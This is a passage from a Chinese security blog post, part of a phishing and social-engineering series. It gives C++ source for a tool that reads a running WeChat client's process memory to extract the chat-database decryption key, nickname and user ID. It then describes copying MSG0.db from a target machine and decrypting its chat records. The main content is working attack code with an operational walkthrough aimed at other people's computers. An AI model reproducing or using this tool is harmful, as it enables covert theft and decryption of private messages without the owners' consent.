        Module32Next(hModuleSnap, &amp;me32);
    }
    pProcessImageBase = (PVOID)me32.modBaseAddr;
    // 关闭句柄
    ::CloseHandle(hModuleSnap);
    return pProcessImageBase;
}
//获取数据库密钥
int GetdbKey(unsigned char* databasekey, unsigned char* wxid)
{
    HWND phandle = FindWindow(&quot;WeChatMainWndForPC&quot;, NULL);//获取句柄
    if (!phandle)
    {
        printf(&quot;%d\n&quot;, GetLastError());
        return 0;
    }
    DWORD pid;
    GetWindowThreadProcessId(phandle, &amp;pid);//获取进程id
    if (!pid)
    {
        return 0;
    }
    printf(&quot;wechat pid = %d\n&quot;, pid);
    HANDLE mProc = OpenProcess(PROCESS_ALL_ACCESS, false, pid);
    if (mProc == NULL)
    {
        return 0;
    }

    wchar_t path[MAX_PATH];
    if (!GetModuleFileNameExW(mProc, NULL, path, MAX_PATH))
        return 0;
    else
    {
        // cout &lt;&lt; &quot;path&quot; &lt;&lt; path &lt;&lt; endl;
        for (int i = 0; i &lt; sizeof(path); ++i) {
            cout &lt;&lt; (char)path[i];
            if (path[i] == &#39;.&#39;)
            {
                wcscpy_s(&amp;path[i], sizeof(L&quot;Win.dll&quot;), L&quot;Win.dll&quot;);
                break;
            }
        }
    }
    cout &lt;&lt; endl;
    for (int i = 0; i &lt; sizeof(path); ++i) {
        cout &lt;&lt; (char)path[i];
    }

    //DWORD WxDatabaseKey = IsWxVersionValid(path);
    //if (!WxDatabaseKey)
    //  return 0;

    DWORD WxDatabaseKey = version4;

    //获取WeChatWin的基址
    DWORD base_address = (DWORD)GetProcessImageBase(pid, &quot;WeChatWin.dll&quot;);
    // printf(&quot;dllbase_address = %p\n&quot;, base_address);

    DWORD dwKeyAddr = base_address + WxDatabaseKey;
    //printf(&quot;Addr = %p\n&quot;, dwKeyAddr);

    int addr = 0;
    DWORD dwOldAttr = 0;
    //获取数据库密钥
    ReadProcessMemory(mProc, (LPCVOID)dwKeyAddr, &amp;addr, 4, NULL);
    //printf(&quot;key addr = %x\n&quot;, addr);
    ReadProcessMemory(mProc, (LPCVOID)addr, databasekey, 0x20, NULL);
    unsigned char wxname[100] = { 0 };

    //获取微信昵称
    DWORD wxAddr = base_address + wxname_addr4;
    //printf(&quot;wxAddr = %x\n&quot;, wxAddr);
    ReadProcessMemory(mProc, (LPCVOID)wxAddr, wxname, 100, NULL);
    printf(&quot;\nname: %s\n&quot;, wxname);
    //获取微信id
    wxAddr = base_address + wxid_addr4;
    //printf(&quot;wxAddr = %x\n&quot;, wxAddr);
    ReadProcessMemory(mProc, (LPCVOID)wxAddr, &amp;addr, 4, NULL);
    //printf(&quot;wxid addr = %x\n&quot;, addr);
    ReadProcessMemory(mProc, (LPCVOID)addr, wxid, 100, NULL);
    printf(&quot;wxid: %s\n&quot;, wxid);
    //打印密钥
    printf(&quot;key: &quot;);
    for (int i = 0; i &lt; 0x20; i++)
    {
        printf(&quot;%02x&quot;, databasekey[i]);
    }


    return 1;
}</code></pre><p>wechatKey.cpp</p>
<pre><code>// wechatKey.cpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。
//
#include &lt;iostream&gt;
#include &quot;Getkey.h&quot;
unsigned char pass[33] = { 0 };
unsigned char filepath[256] = { 0 };
unsigned char wxid[256] = { 0 };
int main()
{
    std::cout &lt;&lt; &quot;Hello World!\n&quot;;
    GetdbKey(pass, wxid);
}</code></pre><p>运行工具得到密钥</p>
<p><img src="/img/wechatDecrypt/015f7461-031b-475f-bbcb-52ff97ce98d3.png" alt="img"></p>
<h2 id="0x05-实战"><a href="#0x05-实战" class="headerlink" title="0x05 实战"></a>0x05 实战</h2><p>下载MSG0.db文件</p>
<p><img src="/img/wechatDecrypt/2b990a2d-3076-42a3-9aad-9a3996251185.jpg" alt="img"></p>
<p>获取密钥</p>
<p><img src="/img/wechatDecrypt/3d433d84-8ef8-483f-8906-3ea491445fe2.jpg" alt="img"></p>
<p>本地解密得到聊天数据内容</p>
<p><img src="/img/wechatDecrypt/f5efd472-2a45-4620-975a-1336e6bc0299.png" alt="img"></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>每一个微信号在每一台机器上面的密钥是固定的，所以只要目标机器登录了微信，那么就可以通过该工具动态获取密钥。然后拖回MSG0.db聊天记录的数据库，解密即可。</p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><pre><code>核心思路 https://www.xuenixiang.com/thread-2409-1-1.html
https://bbs.pediy.com/thread-251303.htm
https://www.dongzt.cn/archives/495.html
https://www.52pojie.cn/thread-1084703-1-1.html
https://blog.csdn.net/weixin_30230009/article/details/105100181
配置openssl教程 https://bbs.pediy.com/thread-251303-1.htm
基址寻找 https://zhuanlan.zhihu.com/p/95932843
核心代码 https://github.com/A2kaid/Get-WeChat-DB</code></pre>
            </div>
            <hr />

            

            <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">

<div id="article-share">
    
    <div class="social-share" data-disabled="qzone" data-wechat-qrcode-helper="<p>微信里点“发现”->“扫一扫”二维码便可查看分享。</p>"></div>
    
</div>

<script src="/libs/share/js/social-share.min.js"></script>

            

    <div class="reprint" id="reprint-statement">
        <p class="reprint-tip">
            <i class="fa fa-exclamation-triangle"></i>&nbsp;&nbsp;
            <span>转载规则</span>
        </p>
        
            <div class="center-align">
                <a rel="license" href="https://creativecommons.org/licenses/by/4.0/deed.zh">
                    <img alt=""
                         style="border-width:0"
                         src="https://i.creativecommons.org/l/by/4.0/88x31.png"/>
                </a>
            </div>
            <br/>
            <span xmlns:dct="http://purl.org/dc/terms/" href="http://purl.org/dc/dcmitype/Text"
                  property="dct:title" rel="dct:type">
                    《钓鱼与社工系列之某信聊天记录解密》
                </span> 由
            <a xmlns:cc="http://creativecommons.org/ns#" href="/2021/06/15/diao-yu-yu-she-gong-xi-lie-zhi-wei-xin-liao-tian-ji-lu-jie-mi/" property="cc:attributionName"
               rel="cc:attributionURL">
                ske
            </a> 采用
            <a rel="license" href="https://creativecommons.org/licenses/by/4.0/deed.zh">
                知识共享署名 4.0 国际许可协议
            </a>进行许可。
        
    </div>

    <script async defer>
      document.addEventListener("copy", function (e) {
        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
        M.toast({html: toastHTML})
      });

      function navToReprintStatement() {
        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
      }
    </script>


        </div>
    </div>

    
    <link rel="stylesheet" href="/libs/gitalk/gitalk.css">
<link rel="stylesheet" href="/css/my-gitalk.css">

<div class="card gitalk-card" data-aos="fade-up">
    <div id="gitalk-container" class="card-content"></div>
</div>

<script src="/libs/gitalk/gitalk.min.js"></script>
<script>
    let gitalk = new Gitalk({
        clientID: '',
        clientSecret: '',
        repo: 'SkewwG.github.io',
        owner: 'SkewwG',
        admin: "SkewwG",
        id: '2021/06/15/diao-yu-yu-she-gong-xi-lie-zhi-wei-xin-liao-tian-ji-lu-jie-mi/',
        distractionFreeMode: false  // Facebook-like distraction free mode
    });

    gitalk.render('gitalk-container');
</script>
    

    

    

    

    
    <style>
    .valine-card {
        margin: 1.5rem auto;
    }

    .valine-card .card-content {
        padding: 20px 20px 5px 20px;
    }

    #vcomments input[type=text],
    #vcomments input[type=email],
    #vcomments input[type=url],
    #vcomments textarea {
        box-sizing: border-box;
    }

    #vcomments p {
        margin: 2px 2px 10px;
        font-size: 1.05rem;
        line-height: 1.78rem;
    }

    #vcomments blockquote p {
        text-indent: 0.2rem;
    }

    #vcomments a {
        padding: 0 2px;
        color: #42b983;
        font-weight: 500;
        text-decoration: underline;
    }

    #vcomments img {
        max-width: 100%;
        height: auto;
        cursor: pointer;
    }

    #vcomments ol li {
        list-style-type: decimal;
    }

    #vcomments ol,
    ul {
        display: block;
        padding-left: 2em;
        word-spacing: 0.05rem;
    }

    #vcomments ul li,
    ol li {
        display: list-item;
        line-height: 1.8rem;
        font-size: 1rem;
    }

    #vcomments ul li {
        list-style-type: disc;
    }

    #vcomments ul ul li {
        list-style-type: circle;
    }

    #vcomments table, th, td {
        padding: 12px 13px;
        border: 1px solid #dfe2e5;
    }

    #vcomments table, th, td {
        border: 0;
    }

    table tr:nth-child(2n), thead {
        background-color: #fafafa;
    }

    #vcomments table th {
        background-color: #f2f2f2;
        min-width: 80px;
    }

    #vcomments table td {
        min-width: 80px;
    }

    #vcomments h1 {
        font-size: 1.85rem;
        font-weight: bold;
        line-height: 2.2rem;
    }

    #vcomments h2 {
        font-size: 1.65rem;
        font-weight: bold;
        line-height: 1.9rem;
    }

    #vcomments h3 {
        font-size: 1.45rem;
        font-weight: bold;
        line-height: 1.7rem;
    }

    #vcomments h4 {
        font-size: 1.25rem;
        font-weight: bold;
        line-height: 1.5rem;
    }

    #vcomments h5 {
        font-size: 1.1rem;
        font-weight: bold;
        line-height: 1.4rem;
    }

    #vcomments h6 {
        font-size: 1rem;
        line-height: 1.3rem;
    }

    #vcomments p {
        font-size: 1rem;
        line-height: 1.5rem;
    }

    #vcomments hr {
        margin: 12px 0;
        border: 0;
        border-top: 1px solid #ccc;
    }

    #vcomments blockquote {
        margin: 15px 0;
        border-left: 5px solid #42b983;
        padding: 1rem 0.8rem 0.3rem 0.8rem;
        color: #666;
        background-color: rgba(66, 185, 131, .1);
    }

    #vcomments pre {
        font-family: monospace, monospace;
        padding: 1.2em;
        margin: .5em 0;
        background: #272822;
        overflow: auto;
        border-radius: 0.3em;
        tab-size: 4;
    }

    #vcomments code {
        font-family: monospace, monospace;
        padding: 1px 3px;
        font-size: 0.92rem;
        color: #e96900;
        background-color: #f8f8f8;
        border-radius: 2px;
    }

    #vcomments pre code {
        font-family: monospace, monospace;
        padding: 0;
        color: #e8eaf6;
        background-color: #272822;
    }

    #vcomments pre[class*="language-"] {
        padding: 1.2em;
        margin: .5em 0;
    }

    #vcomments code[class*="language-"],
    pre[class*="language-"] {
        color: #e8eaf6;
    }

    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
        position: inherit;
        margin-left: -1.3rem;
        margin-right: 0.4rem;
        margin-top: -1px;
        vertical-align: middle;
        left: unset;
        visibility: visible;
    }

    #vcomments b,
    strong {
        font-weight: bold;
    }

    #vcomments dfn {
        font-style: italic;
    }

    #vcomments small {
        font-size: 85%;
    }

    #vcomments cite {
        font-style: normal;
    }

    #vcomments mark {
        background-color: #fcf8e3;
        padding: .2em;
    }

    #vcomments table, th, td {
        padding: 12px 13px;
        border: 1px solid #dfe2e5;
    }

    table tr:nth-child(2n), thead {
        background-color: #fafafa;
    }

    #vcomments table th {
        background-color: #f2f2f2;
        min-width: 80px;
    }

    #vcomments table td {
        min-width: 80px;
    }

    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
        position: inherit;
        margin-left: -1.3rem;
        margin-right: 0.4rem;
        margin-top: -1px;
        vertical-align: middle;
        left: unset;
        visibility: visible;
    }
</style>

<div class="card valine-card" data-aos="fade-up">
    <div id="vcomments" class="card-content"></div>
</div>

<script src="/libs/valine/av-min.js"></script>
<script src="/libs/valine/Valine.min.js"></script>
<!-- <script src="//unpkg.com/valine@latest/dist/Valine.min.js"></script> -->

<script>
    new Valine({
        el: '#vcomments',
        appId: '',
        appKey: '',
        notify: 'false' === 'true',
        verify: 'false' === 'true',
        visitor: 'false' === 'true',
        avatar: 'wavatar',
        pageSize: '10',
        lang: 'zh-cn',
        placeholder: '如果你没有GitHub账号，还可以在这里评论啦！'
    });
</script>

    

    

<article id="prenext-posts" class="prev-next articles">
    <div class="row article-row">
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge left-badge text-color">
                <i class="fa fa-chevron-left"></i>&nbsp;上一篇</div>
            <div class="card">
                <a href="/2021/07/05/java-dai-ma-shen-ji-zhi-zhi-yuan-htmlofficeservlet-lou-dong-fen-xi/">
                    <div class="card-image">
                        
                        <img src="/img/SeeyonHtmlOfficeServlet/3e3a5eb9-947f-4789-96e1-e872b858c2e9.png" class="responsive-img" alt="Java代码审计之致远HtmlOfficeServlet漏洞分析">
                        
                        <span class="card-title">Java代码审计之致远HtmlOfficeServlet漏洞分析</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            致远
                        
                    </div>
                    <div class="publish-info">
                        <span class="publish-date">
                            <i class="fa fa-clock-o fa-fw icon-date"></i>2021-07-05
                        </span>
                        <span class="publish-author">
                            
                            <i class="fa fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/Java代码审计/" class="post-category" target="_blank">
                                    Java代码审计
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/致远/" target="_blank">
                        <span class="chip bg-color">致远</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge right-badge text-color">
                下一篇&nbsp;<i class="fa fa-chevron-right"></i>
            </div>
            <div class="card">
                <a href="/2021/03/09/shellcode-jin-cheng-zhu-ru/">
                    <div class="card-image">
                        
                        <img src="/img/ShellcodeInject/5f0de65c-fe58-4ac6-8751-0e2af990207b.png" class="responsive-img" alt="Shellcode进程注入">
                        
                        <span class="card-title">Shellcode进程注入</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            Shellcode进程注入
                        
                    </div>
                    <div class="publish-info">
                            <span class="publish-date">
                                <i class="fa fa-clock-o fa-fw icon-date"></i>2021-03-09
                            </span>
                        <span class="publish-author">
                            
                            <i class="fa fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/Shellcode/" class="post-category" target="_blank">
                                    Shellcode
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/Shellcode进程注入/" target="_blank">
                        <span class="chip bg-color">Shellcode进程注入</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
    </div>
</article>
</div>


<script>
    $('#articleContent').on('copy', function (e) {
        // IE8 or earlier browser is 'undefined'
        if (typeof window.getSelection === 'undefined') return;

        var selection = window.getSelection();
        // if the selection is short let's not annoy our users.
        if (('' + selection).length < Number.parseInt('120')) {
            return;
        }

        // create a div outside of the visible area and fill it with the selected text.
        var bodyElement = document.getElementsByTagName('body')[0];
        var newdiv = document.createElement('div');
        newdiv.style.position = 'absolute';
        newdiv.style.left = '-99999px';
        bodyElement.appendChild(newdiv);
        newdiv.appendChild(selection.getRangeAt(0).cloneContents());

        // we need a <pre> tag workaround.
        // otherwise the text inside "pre" loses all the line breaks!
        if (selection.getRangeAt(0).commonAncestorContainer.nodeName === 'PRE') {
            newdiv.innerHTML = "<pre>" + newdiv.innerHTML + "</pre>";
        }

        var url = document.location.href;
        newdiv.innerHTML += '<br />'
            + '来源: ske的博客<br />'
            + '作者: ske<br />'
            + '链接: <a href="' + url + '">' + url + '</a><br />'
            + '本文章著作权归作者所有，任何形式的转载都请注明出处。';

        selection.selectAllChildren(newdiv);
        window.setTimeout(function () { bodyElement.removeChild(newdiv); }, 200);
    });
</script>

    

</main>


    <footer class="page-footer bg-color">
    <div class="container row center-align">
        <div class="col s12 m8 l8 copy-right">
            &copy; 2020-~ Ske. 版权所有

            
            &nbsp;<i class="fa fa-area-chart"></i>&nbsp;站点总字数:&nbsp;
            <span class="white-color">62.5k</span>
            

            <br>
            <span id="sitetime"></span>

            
            
            <br>
            
			<span id="busuanzi_container_site_pv" style='display:none'>
				<i class="fa fa-heart-o"></i>
				
			</span>
			
			
			<span id="busuanzi_container_site_uv" style='display:none'>
				
			</span>
			
            
        </div>
        <div class="col s12 m4 l4 social-link social-statis">
    <a href="https://github.com/SkewwG" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
        <i class="fa fa-github"></i>
    </a>



    <a href="mailto:446106525@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
        <i class="fa fa-envelope-open"></i>
    </a>





    <a href="http://wpa.qq.com/msgrd?v=3&uin=446106525&site=qq&menu=yes" class="tooltipped" target="_blank" data-tooltip="访问我的知乎" data-position="top" data-delay="50">
        <i class="fa fa-qq"></i>
    </a>





    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
        <i class="fa fa-rss"></i>
    </a>
</div>
    </div>
</footer>

<div class="progress-bar"></div>

<script language=javascript>
    function siteTime() {
        window.setTimeout("siteTime()", 1000);
        var seconds = 1000;
        var minutes = seconds * 60;
        var hours = minutes * 60;
        var days = hours * 24;
        var years = days * 365;
        var today = new Date();
        var todayYear = today.getFullYear();
        var todayMonth = today.getMonth() + 1;
        var todayDate = today.getDate();
        var todayHour = today.getHours();
        var todayMinute = today.getMinutes();
        var todaySecond = today.getSeconds();
        /* Date.UTC() -- 返回date对象距世界标准时间(UTC)1970年1月1日午夜之间的毫秒数(时间戳)
        year - 作为date对象的年份，为4位年份值
        month - 0-11之间的整数，做为date对象的月份
        day - 1-31之间的整数，做为date对象的天数
        hours - 0(午夜24点)-23之间的整数，做为date对象的小时数
        minutes - 0-59之间的整数，做为date对象的分钟数
        seconds - 0-59之间的整数，做为date对象的秒数
        microseconds - 0-999之间的整数，做为date对象的毫秒数 */
        var t1 = Date.UTC(2020, 11, 25, 00, 00, 00); //北京时间2018-2-13 00:00:00
        var t2 = Date.UTC(todayYear, todayMonth, todayDate, todayHour, todayMinute, todaySecond);
        var diff = t2 - t1;
        var diffYears = Math.floor(diff / years);
        var diffDays = Math.floor((diff / days) - diffYears * 365);
        var diffHours = Math.floor((diff - (diffYears * 365 + diffDays) * days) / hours);
        var diffMinutes = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours) / minutes);
        var diffSeconds = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours - diffMinutes * minutes) / seconds);
        document.getElementById("sitetime").innerHTML = "本站已运行 " + diffYears + " 年 " + diffDays + " 天 " + diffHours + " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
    }/*因为建站时间还没有一年，就将之注释掉了。需要的可以取消*/
    siteTime();
</script>

<!-- 不蒜子计数初始值纠正 -->
<script>
    $(document).ready(function () {

        var int = setInterval(fixCount, 50);
        var pvcountOffset = 80000;
        var uvcountOffset = 20000;

        function fixCount() {
            if (document.getElementById("busuanzi_container_site_pv").style.display != "none") {
                $("#busuanzi_value_site_pv").html(parseInt($("#busuanzi_value_site_pv").html()) + pvcountOffset);
                clearInterval(int);
            }
            if ($("#busuanzi_container_site_pv").css("display") != "none") {
                $("#busuanzi_value_site_uv").html(parseInt($("#busuanzi_value_site_uv").html()) + uvcountOffset); // 加上初始数据 
                clearInterval(int);
            }
        }
    });
</script>

    <!-- 搜索遮罩框 -->
<div id="searchModal" class="modal">
    <div class="modal-content">
        <div class="search-header">
            <span class="title"><i class="fa fa-search"></i>&nbsp;&nbsp;搜索</span>
            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
                   class="search-input">
        </div>
        <div id="searchResult"></div>
    </div>
</div>

<script src="/js/search.js"></script>
<script type="text/javascript">
$(function () {
    searchFunc("/" + "search.xml", 'searchInput', 'searchResult');
});
</script>
    <!-- 回到顶部按钮 -->
<div id="backTop" class="top-scroll">
    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
        <i class="fa fa-angle-up"></i>
    </a>
</div>


    <script src="/libs/materialize/materialize.min.js"></script>
    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
    <script src="/libs/aos/aos.js"></script>
    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
    <script src="/js/matery.js"></script>

    <script type="text/javascript"> var OriginTitile = document.title, st; document.addEventListener("visibilitychange", function () { document.hidden ? (document.title = "Σ(っ °Д °;)っ喔哟，崩溃啦！", clearTimeout(st)) : (document.title = "φ(゜▽゜*)♪咦，又好了！", st = setTimeout(function () { document.title = OriginTitile }, 3e3)) })
    </script>

    <!-- Global site tag (gtag.js) - Google Analytics -->

<script async src="https://www.googletagmanager.com/gtag/js?id="></script>
<script>
    window.dataLayer = window.dataLayer || [];
    function gtag() {
        dataLayer.push(arguments);
    }

    gtag('js', new Date());
    gtag('config', '');
</script>



    
    <script src="/libs/others/clicklove.js"></script>
    

    
    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
    

    <!-- 雪花特效 -->
    

</body>

</html>